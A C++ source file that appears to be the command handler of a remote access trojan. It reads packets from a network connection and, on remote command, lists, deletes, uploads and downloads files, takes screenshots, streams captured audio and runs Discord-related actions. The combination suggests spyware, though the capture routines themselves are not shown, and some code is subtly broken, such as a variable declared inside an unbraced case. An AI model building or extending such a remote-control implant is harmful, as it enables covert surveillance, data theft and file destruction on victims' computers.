#include "controller.h"

#include <iostream>
#include <thread>

#include "packets.h"
#include "commands.h"
#include "util.h"

using namespace std;


void Controller::handleData(const vector<char>& buf) {
	int offset = 0;
	uint32_t size = get<uint32_t>(buf, &offset);
	uint8_t command = get<uint8_t>(buf, &offset);
	
	int ret;
	switch (command) {
		ECASE(Packet::navigate):
			switch (get<uint8_t>(buf, &offset)) {
				ECASE(NavigateCommand::ls):
					ret = listFiles(this, get<string>(buf, &offset));
					break;
				ECASE(NavigateCommand::cd):
					ret = changeDir(this, get<string>(buf, &offset));
					break;
				ECASE(NavigateCommand::pwd):
					ret = pwd(this);
					break;
				ECASE(NavigateCommand::rm):
					ret = removeFile(this, get<string>(buf, &offset));
					break;
			}
			break;
		ECASE(Packet::discordCommand):
			ret = discordCommand(this, (DiscordCommand) get<uint8_t>(buf, &offset));
			break;
		ECASE(Packet::screenshot):
			ret = screenshot(this);
			break;
		ECASE(Packet::audioCommand):
			ret = audioCommand(this, (AudioCommand) get<uint32_t>(buf, &offset));
			break;
		ECASE(Packet::downloadFile):
			ret = downloadFile(this, get<string>(buf, &offset));
			break;
		ECASE(Packet::uploadFile):
			string& str = get<string>(buf, &offset);
			size_t size = get<uint32_t>(buf, &offset);
			ret = uploadFile(this, str, size, &buf[offset]);
			break;
	}

	this->ret(ret);
}

void Controller::ret(int code) {
	vector<char> buf;
	writeUInt32(buf, 2);
	buf.push_back(0);
	buf.push_back(code);
	conn->write(buf);
}

void Controller::sendOut(const string out) {
	vector<char> buf;
	writeUInt32(buf, 1 + 4+out.size());
	buf.push_back(1);
	writeString(buf, out);
	conn->write(buf);
}

void Controller::sendErr(const string err) {
	vector<char> buf;
	writeUInt32(buf, 1 + 4+err.size());
	buf.push_back(2);
	writeString(buf, err);
	conn->write(buf);
}

void Controller::sendBuffer(const char* data, size_t size) {
	vector<char> buf;
	writeUInt32(buf, 1 + 4+size);
	buf.push_back(3);
	writeBuffer(buf, data, size);
	conn->write(buf);
}

void Controller::sendBuffer(const vector<char>& data) {
	vector<char> buf;
	writeUInt32(buf, 1 + 4+data.size());
	buf.push_back(3);
	writeBuffer(buf, data);
	conn->write(buf);
}

void Controller::bufferAudio(const char* data, size_t size) {
	for (int i = 0; i < size; i++) {
		audioQueue.push(data[i]);
	}
}

void Controller::flushAudioBuffer() {
	while (true) {
		if (audioQueue.size() > 0) {
			int size = audioQueue.size();
			vector<char> buf;
			writeUInt32(buf, 1 + 4+size);
			buf.push_back(4);
			writeUInt32(buf, size);
			for (int i = 0; i < size; i++) {
				buf.push_back(audioQueue.front());
				audioQueue.pop();
			}
			conn->write(buf);
		}
		this_thread::sleep_for(chrono::milliseconds(10));
	}
}

void Controller::loop() {
	thread audioFlushThread(&Controller::flushAudioBuffer, this);
	while (true) {
		conn->read(Controller::handleDataCallback, this);
	}
}
